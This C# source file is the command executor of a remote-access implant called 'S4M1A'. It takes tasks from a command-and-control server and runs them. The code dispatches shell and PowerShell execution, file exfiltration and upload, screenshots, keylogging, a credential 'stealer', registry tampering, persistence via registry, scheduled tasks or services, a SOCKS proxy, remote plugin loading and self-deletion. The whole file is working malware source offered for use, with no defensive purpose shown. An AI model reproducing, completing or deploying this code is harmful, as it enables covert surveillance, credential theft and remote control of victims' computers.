using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using S4M1A.Implant.Modules;

namespace S4M1A.Implant
{
    // =====================================================================
    //  S4M1A Commands v2.0 - command executor (implant side)
    //
    //  Contract: the C2 sends one flat command per beacon reply:
    //    {"t":"cmd","cid":"<task id>","cmd":"<name>","args":"<argument string>"}
    //  This class returns a JSON result string:
    //    {"ok":true/false,"data":"<output>","act":""}
    //  "act" informs the beacon loop: "" normal, "sleep" change interval,
    //  "killme" kill switch, "uninstall" clean + self delete, "restart".
    //
    //  Supported commands:
    //    shell | powershell | ps | kill | cd | ls | cat | download | upload |
    //    screenshot | keylog_start | keylog_stop | keylog_flush | stealer |
    //    reg (registry: list/read/set/del/mk) |
    //    persist | socks | plugin | sleep | killme | uninstall
    //  Module contracts (implemented in src/Implant/Modules/):
    //    Shell.Run(string cmd, bool ps) -> string
    //    FileManager.List(path) -> string | FileManager.ReadB64(p) -> string
    //    FileManager.WriteB64(p, b64) -> bool | Screenshot.TakeB64() -> string
    //    Keylogger.Running | Keylogger.Start() | Keylogger.StopAndFlush() -> string
    //    Keylogger.Flush() -> string (b64, clears buffer)
    //    Stealer.Collect() -> string (summary) | Persistence.Add(name,type,payload)
    //    Persistence.Remove(name) | Socks5.Start(int port) | Socks5.Stop()
    //    PluginLoader.LoadB64(string b64, string key) -> string
    // =====================================================================

    internal static class JsonUtil
    {
        public static string Escape(string s)
        {
            if (s == null) return "";
            StringBuilder sb = new StringBuilder(s.Length + 16);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"':  sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n");  break;
                    case '\r': sb.Append("\\r");  break;
                    case '\t': sb.Append("\\t");  break;
                    default:
                        if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("x4"));
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        public static string Get(string json, string key)
        {
            string marker = "\"" + key + "\":\"";
            int i = json.IndexOf(marker);
            if (i < 0) return null;
            int start = i + marker.Length;
            int pos = start;
            StringBuilder sb = new StringBuilder();
            while (pos < json.Length)
            {
                char c = json[pos];
                if (c == '\\')
                {
                    if (pos + 1 < json.Length)
                    {
                        char n = json[pos + 1];
                        switch (n)
                        {
                            case 'n': sb.Append('\n'); break;
                            case 'r': sb.Append('\r'); break;
                            case 't': sb.Append('\t'); break;
                            case 'b': sb.Append('\b'); break;
                            case 'f': sb.Append('\f'); break;
                            case '/': sb.Append('/'); break;
                            case '"': sb.Append('"'); break;
                            case '\\': sb.Append('\\'); break;
                            case 'u':
                                if (pos + 5 < json.Length)
                                {
                                    try
                                    {
                                        sb.Append((char)Convert.ToInt32(
                                            json.Substring(pos + 2, 4), 16));
                                        pos += 6;
                                        continue;
                                    }
                                    catch { sb.Append(n); }
                                }
                                else sb.Append(n);
                                break;
                            default: sb.Append(n); break;
                        }
                        pos += 2;
                        continue;
                    }
                    break;
                }
                if (c == '"') break;
                sb.Append(c);
                pos++;
            }
            return sb.ToString();
        }

        // Parses a flat object {"k":"v",...} into a dictionary (values are
        // unescaped; nested objects/arrays are intentionally unsupported).
        public static Dictionary<string, string> ParseFlat(string json)
        {
            Dictionary<string, string> d = new Dictionary<string, string>();
            if (string.IsNullOrEmpty(json)) return d;
            int i = 0;
            while (i < json.Length)
            {
                int ks = json.IndexOf('"', i);
                if (ks < 0) break;
                int ke = json.IndexOf('"', ks + 1);
                if (ke < 0) break;
                string key = json.Substring(ks + 1, ke - ks - 1);

                int colon = json.IndexOf(':', ke);
                if (colon < 0) break;
                int vs = json.IndexOf('"', colon + 1);
                if (vs < 0)
                {
                    // value is not a string (bool/number) - read verbatim
                    int ve = json.IndexOfAny(new char[] { ',', '}' }, colon + 1);
                    if (ve < 0) ve = json.Length;
                    d[key] = json.Substring(colon + 1, ve - colon - 1).Trim();
                    i = ve;
                    continue;
                }
                int vEnd = vs + 1;
                StringBuilder val = new StringBuilder();
                while (vEnd < json.Length)
                {
                    char c = json[vEnd];
                    if (c == '\\')
                    {
                        if (vEnd + 1 < json.Length)
                        {
                            char n = json[vEnd + 1];
                            if (n == 'n') val.Append('\n');
                            else if (n == 'r') val.Append('\r');
                            else if (n == 't') val.Append('\t');
                            else val.Append(n);
                            vEnd += 2;
                            continue;
                        }
                    }
                    else if (c == '"') break;
                    else val.Append(c);
                    vEnd++;
                }
                d[key] = val.ToString();
                i = vEnd + 1;
            }
            return d;
        }
    }

    public static class Commands
    {
        private const int MaxFileBytes = 10 * 1024 * 1024; // 10 MB per transfer

        public static string Execute(string cmd, string args)
        {
            try
            {
                switch (cmd)
                {
                    case "shell": return Ok(Shell.Run(args, false));
                    case "powershell": return Ok(Shell.Run(args, true));
                    case "ps": return Ok(ListProcesses());
                    case "kill": return KillProcess(args);
                    case "cd": return OkOrErr(FileManager.Cd(args));
                    case "ls": return OkOrErr(FileManager.List(args));
                    case "cat": return OkOrErr(FileManager.ReadText(args));
                    case "download": return Download(args);
                    case "upload": return Upload(args);
                    case "screenshot":
                        string shot = Screenshot.TakeB64();
                        return shot == null ? Err("screenshot failed") : Ok(shot);
                    case "keylog_start": Keylogger.Start(); return Ok("keylogger started");
                    case "keylog_stop": return Ok(Keylogger.StopAndFlush());
                    case "keylog_flush": return Ok(Keylogger.Flush());
                    case "stealer": return Ok(Stealer.Collect());
                    case "reg": return Reg(args);
                    case "persist": return Persist(args);
                    case "socks": return Socks(args);
                    case "plugin": return Ok(PluginLoader.LoadB64(args, null));
                    case "sleep":
                        int ms;
                        if (int.TryParse(args, out ms) && ms >= 1000 && ms <= 3600000)
                            return Ok("sleep interval set", "sleep");
                        return Err("invalid sleep interval (1000-3600000)");
                    case "killme": return Ok("kill switch received", "killme");
                    case "uninstall": return Ok("uninstall received", "uninstall");
                    default: return Err("unknown command: " + cmd);
                }
            }
            catch (Exception ex)
            {
                return Err(ex.Message);
            }
        }

        // ------------------------- registry -------------------------

        // args: list <key> | read <key>|<value> | set <key>|<value>|<type>|<data>
        //       | del <key>|<value> | mk <key>
        // key  : HKCU\Software\MyApp  (HKCR|HKCU|HKLM|HKU|HKCC)
        // type : s=string d=dword q=qword b=binary(hex) m=multi(strings;sep)
        private static string Reg(string args)
        {
            string[] parts = SplitArgs(args);
            if (parts.Length == 0) return Err("usage: reg list|read|set|del|mk ...");
            switch (parts[0])
            {
                case "list":
                    if (parts.Length != 2)
                        return Err("usage: reg list <key>");
                    return Ok(RegistryManager.List(parts[1]));
                case "read":
                    if (parts.Length != 3)
                        return Err("usage: reg read <key>|<value>");
                    return Ok(RegistryManager.ReadValue(parts[1], parts[2]));
                case "set":
                    if (parts.Length != 5)
                        return Err("usage: reg set <key>|<value>|<s|d|q|b|m>|<data>");
                    return Ok(RegistryManager.SetValue(parts[1], parts[2], parts[3], parts[4]));
                case "del":
                    if (parts.Length < 2 || parts.Length > 3)
                        return Err("usage: reg del <key>|<value>");
                    return Ok(RegistryManager.Delete(parts[1],
                                                    parts.Length == 3 ? parts[2] : ""));
                case "mk":
                    if (parts.Length != 2)
                        return Err("usage: reg mk <key>");
                    return Ok(RegistryManager.CreateKey(parts[1]));
                default:
                    return Err("unknown reg op: " + parts[0]);
            }
        }

        // ------------------------- process helpers -------------------------

        private static string ListProcesses()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    long mem = p.WorkingSet64 / 1024 / 1024;
                    sb.Append(p.Id).Append("\t").Append(mem).Append("MB\t")
                      .Append(p.ProcessName).Append("\n");
                }
                catch { }
            }
            return sb.ToString();
        }

        private static string KillProcess(string args)
        {
            int pid;
            if (!int.TryParse(args.Trim(), out pid)) return Err("usage: kill <pid>");
            using (Process p = Process.GetProcessById(pid))
            {
                string name = p.ProcessName;
                p.Kill();
                return Ok("killed " + name + " (" + pid + ")");
            }
        }

        // ------------------------- file transfer -------------------------

        private static string Download(string path)
        {
            string b64 = FileManager.ReadB64(path);
            if (b64 == null || b64.StartsWith("ERR:"))
                return Err(b64 == null ? "file not found or unreadable: " + path : b64);
            if (b64.Length > (MaxFileBytes * 4) / 3 + 16)
                return Err("file too large (max 10 MB)");
            return Ok(b64);
        }

        // Wraps module results that use "ERR: ..." sentinel strings into a
        // proper error response (ok=false) instead of ok=true with error text.
        private static string OkOrErr(string result)
        {
            if (result != null && result.StartsWith("ERR:")) return Err(result);
            return Ok(result);
        }

        private static string Upload(string args)
        {
            // args format: <target_path>|<base64>
            int sep = args.IndexOf('|');
            if (sep <= 0) return Err("usage: upload <target_path>|<base64>");
            string path = args.Substring(0, sep);
            string b64 = args.Substring(sep + 1);
            if (b64.Length > (MaxFileBytes * 4) / 3 + 16)
                return Err("payload too large");
            if (FileManager.WriteB64(path, b64)) return Ok("written: " + path);
            return Err("write failed: " + path);
        }

        // ------------------------- misc -------------------------

        private static string Persist(string args)
        {
            // args: add|<name>|<type:reg|sched|service>|<payload>  OR  remove|<name>
            string[] parts = SplitArgs(args);
            if (parts.Length >= 4 && parts[0] == "add")
                return Ok(Persistence.Add(parts[1], parts[2], parts[3]));
            if (parts.Length == 2 && parts[0] == "remove")
                return Ok(Persistence.Remove(parts[1]));
            return Err("usage: persist add|<name>|<reg|sched|service>|<payload> | remove|<name>");
        }

        private static string Socks(string args)
        {
            string[] parts = SplitArgs(args);
            if (parts.Length == 2 && parts[0] == "start")
            {
                int port;
                if (int.TryParse(parts[1], out port)) return Ok(Socks5.Start(port));
                return Err("invalid port");
            }
            if (parts.Length == 1 && parts[0] == "stop") return Ok(Socks5.Stop());
            return Err("usage: socks start <port> | stop");
        }

        private static string[] SplitArgs(string s)
        {
            return (s ?? "").Split(new char[] { '|' }, StringSplitOptions.RemoveEmptyEntries);
        }

        private static string Ok(string data)
        {
            return Ok(data, "");
        }

        private static string Ok(string data, string act)
        {
            return "{\"ok\":true,\"data\":\"" + JsonUtil.Escape(data ?? "")
                 + "\",\"act\":\"" + act + "\"}";
        }

        private static string Err(string msg)
        {
            return "{\"ok\":false,\"data\":\"\",\"err\":\""
                 + JsonUtil.Escape(msg ?? "") + "\",\"act\":\"\"}";
        }
    }
}